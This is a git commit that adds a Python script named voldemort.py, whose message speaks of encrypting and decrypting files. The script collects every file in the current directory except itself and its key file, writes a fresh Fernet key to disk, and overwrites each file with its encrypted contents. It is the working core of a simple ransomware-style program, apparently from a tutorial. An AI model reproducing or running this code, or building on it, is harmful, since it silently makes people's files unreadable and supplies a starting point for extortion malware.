a5c5af1d90e06e1355d6f637f5eb8aecdf2d3f99
mgorem <oremgitonga22@gmail.com>
2022-06-12 17:08:35 +0300

    create files, encrypt and decrypt

---
+++ voldemort.py
@@ -0,0 +1,27 @@
+
+import os
+from cryptography.fernet import Fernet
+
+# Let's find some files
+
+files = []
+
+for file in os.listdir():
+	if file == "voldemort.py" or file == "thekey.key":
+		continue
+	if os.path.isfile(file):
+		files.append(file)
+print(files)
+
+
+key = Fernet.generate_key()
+
+with open("thekey.key", "wb") as thekey:
+	thekey.write(key)
+
+for file in files:
+	with open(file, "rb") as thefile:
+		contents = thefile.read()
+	contents_encrypted = Fernet(key).encrypt(contents)
+	with open(file, "wb") as thefile:
+		thefile.write(contents_encrypted)
